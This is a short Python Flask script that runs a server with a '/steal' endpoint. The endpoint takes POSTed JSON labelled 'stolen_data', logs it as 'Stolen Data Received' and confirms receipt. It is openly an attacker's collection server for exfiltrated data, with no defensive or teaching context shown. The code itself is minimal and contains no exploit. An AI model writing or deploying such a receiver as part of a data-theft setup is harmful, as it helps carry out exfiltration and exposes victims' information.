from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal_data():
    stolen_data = request.json.get("stolen_data", "No Data")
    print(f"[!] Stolen Data Received: {stolen_data}")
    return {"status": "received"}, 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
